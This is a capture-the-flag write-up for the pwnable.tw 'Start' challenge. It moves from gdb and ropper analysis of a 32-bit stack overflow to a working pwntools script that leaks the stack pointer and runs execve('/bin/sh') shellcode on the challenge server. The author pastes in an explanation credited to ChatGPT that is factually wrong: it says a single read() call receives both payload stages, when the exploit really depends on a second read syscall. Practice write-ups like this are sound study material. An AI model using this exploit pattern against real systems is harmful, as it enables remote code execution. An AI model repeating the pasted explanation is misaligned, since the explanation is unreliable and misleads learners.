# Start

Start \[100 points]

Description: Just a start.

`nc chall.pwnable.tw 10000`

```bash
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

```bash
$ checksec start
[*] '/mnt/c/Users/hzqzz/Downloads/pwnable/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Running the file

```bash
$ ./start
Let's start the CTF:zeqzoq
```

We can input text here. As this is a pwn challenge, lets use gdb. More specifically, I use pwbdbg

```bash
$ gdb start
```

```bash
pwndbg> info function
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
```

```bash
pwndbg> disassemble _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
End of assembler dump.
```

```bash
pwndbg> run
Starting program: /mnt/c/Users/hzqzz/Downloads/pwnable/start
Let's start the CTF:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0x3c
 EBX  0
 ECX  0xffffcae4 ◂— 0x41414141 ('AAAA')
 EDX  0x3c
 EDI  0
 ESI  0
 EBP  0
 ESP  0xffffcafc ◂— 0x41414141 ('AAAA')
 EIP  0x41414141 ('AAAA')
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
Invalid address 0x41414141


───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcafc ◂— 0x41414141 ('AAAA')
... ↓        7 skipped
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x41414141 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Looks like just a basic stack overflow. When I run the file and input bunch of A's, the A's has overwrite some of the instruction pointer. Now we want to determine the value of the offset.

```bash
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
Starting program: /mnt/c/Users/hzqzz/Downloads/pwnable/start
Let's start the CTF:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616166 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0x3c
 EBX  0
 ECX  0xffffcae4 ◂— 0x61616161 ('aaaa')
 EDX  0x3c
 EDI  0
 ESI  0
 EBP  0
 ESP  0xffffcafc ◂— 0x61616167 ('gaaa')
 EIP  0x61616166 ('faaa')
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
Invalid address 0x61616166




───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcafc ◂— 0x61616167 ('gaaa')
01:0004│     0xffffcb00 ◂— 0x61616168 ('haaa')
02:0008│     0xffffcb04 ◂— 0x61616169 ('iaaa')
03:000c│     0xffffcb08 ◂— 0x6161616a ('jaaa')
04:0010│     0xffffcb0c ◂— 0x6161616b ('kaaa')
05:0014│     0xffffcb10 ◂— 0x6161616c ('laaa')
06:0018│     0xffffcb14 ◂— 0x6161616d ('maaa')
07:001c│     0xffffcb18 ◂— 0x6161616e ('naaa')
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x61616166 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

As this file is 32-bit ELF file, we take a look at EIP after input the cyclic pattern. Notice that `faaa` is in the EIP. Using `cyclic -l` we can determine the value of the offset.

```bash
pwndbg> cyclic -l faaa
Finding cyclic pattern of 4 bytes: b'faaa' (hex: 0x66616161)
Found at offset 20
```

To verify

```bash
pwndbg> pi print('A'*20+'B'*4)
AAAAAAAAAAAAAAAAAAAABBBB
pwndbg> run
Starting program: /mnt/c/Users/hzqzz/Downloads/pwnable/start
Let's start the CTF:AAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0x19
 EBX  0
 ECX  0xffffcae4 ◂— 0x41414141 ('AAAA')
 EDX  0x3c
 EDI  0
 ESI  0
 EBP  0
 ESP  0xffffcafc —▸ 0xffffcb0a ◂— 0xccb40000
 EIP  0x42424242 ('BBBB')
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
Invalid address 0x42424242

───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcafc —▸ 0xffffcb0a ◂— 0xccb40000
01:0004│     0xffffcb00 ◂— 1
02:0008│     0xffffcb04 —▸ 0xffffcc89 ◂— '/mnt/c/Users/hzqzz/Downloads/pwnable/start'
03:000c│     0xffffcb08 ◂— 0
04:0010│     0xffffcb0c —▸ 0xffffccb4 ◂— 'SHELL=/bin/bash'
05:0014│     0xffffcb10 —▸ 0xffffccc4 ◂— 'NVM_RC_VERSION='
06:0018│     0xffffcb14 —▸ 0xffffccd4 ◂— 'WSL2_GUI_APPS_ENABLED=1'
07:001c│     0xffffcb18 —▸ 0xffffccec ◂— 'WSL_DISTRO_NAME=kali-linux'
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x42424242 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Look at ECX and EIP. We successfully overwrite with A's and B's. This challenge is not ret2win like I always do (im noob so I only know ret2win chall) so we need to inject a shellcode to the remote connection and get the root. So use ropper to find the gadgets.

```bash
$ pipx run ropper --file start
Gadgets
=======

0x0804809b: adc al, 0xc3; pop esp; xor eax, eax; inc eax; int 0x80;
0x08048099: add esp, 0x14; ret;
0x080480a0: inc eax; int 0x80;
0x0804808f: int 0x80;
0x08048097: int 0x80; add esp, 0x14; ret;
0x08048085: je 0xae; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809a: les edx, ptr [ebx + eax*8]; pop esp; xor eax, eax; inc eax; int 0x80;
0x08048095: mov al, 3; int 0x80;
0x08048095: mov al, 3; int 0x80; add esp, 0x14; ret;
0x0804808d: mov al, 4; int 0x80;
0x0804808b: mov bl, 1; mov al, 4; int 0x80;
0x08048089: mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x08048093: mov dl, 0x3c; mov al, 3; int 0x80;
0x08048093: mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x08048087: mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809d: pop esp; xor eax, eax; inc eax; int 0x80;
0x08048090: xor byte ptr [ecx], 0xdb; mov dl, 0x3c; mov al, 3; int 0x80;
0x08048090: xor byte ptr [ecx], 0xdb; mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x0804809e: xor eax, eax; inc eax; int 0x80;
0x08048091: xor ebx, ebx; mov dl, 0x3c; mov al, 3; int 0x80;
0x08048091: xor ebx, ebx; mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809c: ret;

23 gadgets found
```

We want to search for esp.&#x20;

The address 0x08048087 points to a little “gadget” that makes a write system call. In our exploit, we overwrite EIP with that address so that when the program returns, it executes these instructions:

* **mov ecx, esp:** This sets the ECX register to point to the current stack pointer, where our payload (including our shellcode) is located.
* **mov dl, 0x14; mov bl, 1; mov al, 4:** These instructions load the appropriate values into registers so that when the interrupt is triggered, the parameters for the write system call are set up. Here, EAX = 4 specifies sys\_write, EBX = 1 means “write to stdout,” and EDX = 0x14 tells write to output 20 bytes.
* **int 0x80:** This performs the system call.

By jumping to this gadget, we cause the process to write (leak) the bytes at our stack. Basically, if we want to inject our shellcode and execute it, we want to put it in the stack, so we search for top of the stack address. (I also dont know what im talking about so help me too) Now we want a shellcode. We can use shellcraft or MSFVenom to get it.

For shellcraft, remember our file command? `start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped`. It shows that our binary is a 32-bit binary built for the Intel 80386 architecture, which is commonly referred to as **i386**.&#x20;

```bash
$ shellcraft -l
aarch64.android.cat
aarch64.android.cat2
aarch64.android.connect
...
i386.linux.sh
...
thumb.to_arm
thumb.trap
thumb.udiv_10
```

Now get the required shellcode

```bash
$ shellcraft i386.linux.sh
6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
```

You can specify `shellcode = asm(shellcraft.i386.linux.sh())` when doing pwntools script. Here is the exploit. Notice that I didn't use the shellcraft shellcode because I couldn't make it to work. This is \[@duckie]\([https://hackmd.io/@duckie/start\_pwnabletw](https://hackmd.io/@duckie/start_pwnabletw)) shellcode. I WILL COME BACK TO THIS PAGE BECAUSE I DID NOT KNOW ANYTHING ABOUTTHIS. HERE IS ALL THE CHATGPT!!

```python
#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='i386')

# shellcode = asm(shellcraft.i386.linux.sh())
shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x31\xd2\x89\xe3\xb0\x0b\xcd\x80\x30\xc0\xfe\xc0\xcd\x80"

p = remote('chall.pwnable.tw',10000)

prompt = p.recvuntil(b'CTF:')
log.info(f"Received prompt: {prompt}")

padding = b'A' * 20

payload_stage1 = padding + p32(0x08048087)

p.send(payload_stage1)

leaked = p.recv()
esp = u32(leaked[:4])

log.success(f"Found ESP at: 0x{esp:08x}")

offset = 20
payload_stage2  = padding + p32(esp + offset) + shellcode

p.send(payload_stage2)

p.interactive()
```

START OF THE CHATGPT

```python
#!/usr/bin/env python3
from pwn import *

# Tell Pwntools we’re dealing with a 32-bit Linux binary
context(os='linux', arch='i386')

# Hard-coded shellcode that executes /bin/sh via execve.
# (Alternatively: asm(shellcraft.i386.linux.sh()))
shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x31\xd2\x89\xe3\xb0\x0b\xcd\x80\x30\xc0\xfe\xc0\xcd\x80"

# Connect to the remote service
p = remote('chall.pwnable.tw', 10000)

# The program prints "Let's start the CTF:" before calling read()
prompt = p.recvuntil(b'CTF:')
log.info(f"Received prompt: {prompt}")

# We know the vulnerable buffer is 20 bytes long.
# We'll fill it up (padding) and then overwrite EIP.
padding = b'A' * 20

#
# ──[ Stage 1: Leak Stack Pointer ]──
#
# We overwrite EIP with 0x08048087:
#   - This "gadget" does:  mov ecx, esp; mov dl, 0x14; mov bl,1; mov al,4; int 0x80
#   - Which essentially does: write(1, ESP, 0x14)
#   - This writes 20 bytes from our own stack back to us, leaking the first 4 as the stack pointer.
#
payload_stage1 = padding + p32(0x08048087)

# Send the first stage. Pwntools won't close the connection; the server's read() is still the same single call.
p.send(payload_stage1)

# Read the leaked 20 bytes. The first 4 bytes is the actual ESP value.
leaked = p.recv()
esp = u32(leaked[:4])
log.success(f"Found ESP at: 0x{esp:08x}")

#
# ──[ Stage 2: Jump to Shellcode ]──
#
# We again overflow the 20-byte buffer, but this time we place a new EIP that points to our shellcode.
#
offset = 20
payload_stage2  = padding
payload_stage2 += p32(esp + offset)  # EIP: jump to esp + 20 (sometimes need +24, etc.)
payload_stage2 += shellcode          # The shellcode is appended right after.

# Send stage 2. This still goes into the same read call on the server side.
p.send(payload_stage2)

# If the offset is correct, execution will land in our shellcode. We should get a shell.
p.interactive()

```

### How It Works

1. **Single `read()`, But Two Partial Sends**\
   The `start` binary only calls `read()` **once** and can read up to 60 bytes. By doing `p.send(...)` twice, you place two separate chunks into that single buffer:
   * **Stage 1:** Overwrite EIP with `0x08048087`, which triggers a `write` syscall that leaks the top 20 bytes of the stack (including the stack pointer).
   * **Stage 2:** Once you know `ESP`, you send more data that overwrites EIP _again_, this time pointing into your shellcode.
2.  **The Write Gadget (0x08048087)**\
    This gadget does:

    ```assembly
    assemblyCopyEditmov ecx, esp
    mov dl, 0x14      ; set EDX=0x14 (20 in decimal)
    mov bl, 1         ; EBX=1 => stdout
    mov al, 4         ; EAX=4 => sys_write
    int 0x80
    ```

    Result: `write(1, esp, 20)`. You receive those 20 bytes in your script with `p.recv()`. The first 4 bytes is the stack pointer, which is critical because you need to know where in memory you can safely place—and jump to—your shellcode.
3. **Crafting the Final Jump (Stage 2)**
   * You create another 20-byte padding to fill the buffer.
   * Overwrite EIP with `esp + offset`.
   * Append your shellcode.
   * Because the program is still in the same `read()`, all 40+ bytes (first stage + second stage) end up in the same buffer. After the write gadget returns, the CPU “continues” into memory that now holds your second overwrite, eventually jumping to `esp + offset` and running your shellcode.
4. **Shellcode**\
   The code is a standard Linux/x86 `execve("/bin/sh")` shellcode. After successfully calling `execve`, you get an interactive shell if all offsets align.

how did we can send two input when the connection has one read() only?

Because the server is doing a single `read()` call of _up to_ some maximum number of bytes (e.g., 60), it will sit there waiting until either:

1. It has read that many bytes, **or**
2. The client closes the connection (EOF).

Pwntools (and TCP in general) allows you to send data in **partial chunks** before closing the connection. Even though the server calls `read()` exactly once, that `read()` can still receive all of those chunks in sequence, effectively concatenating them into one buffer on the server side.

#### How It Plays Out

1. **Server calls** `read(0, buf, 60);`
   * This means “read _up to_ 60 bytes from stdin into `buf`.”
2.  **Client (Pwntools) does something like**:

    ```python
    pythonCopyEditp.send(first_chunk)
    leaked = p.recv(20)   # receives the server's response
    p.send(second_chunk)
    p.interactive()
    ```

    Under the hood, these two `.send()` calls are just writing into the same TCP stream. From the server’s perspective, it’s still the _same_ `read()` call. As soon as the server has read all the bytes the client sent (and the client either stops sending or closes), `read()` returns on the server side with the entire concatenation of `first_chunk + second_chunk`.
3. **The server code continues** after `read()` returns. Because you carefully crafted your first chunk to do something interesting (like call a `write` gadget that leaks data), you can read that leaked data on your side, then _continue_ sending more bytes. Eventually, all of it gets stuffed into the server’s single buffer for that one `read()` call.

This is exactly how you can have a “two-stage” (or multi-stage) exploit despite only one `read()`. Each partial `send` from the client is received and buffered by the same `read()` call on the server. The key is simply **not to close** your sending side until you've sent everything you need.
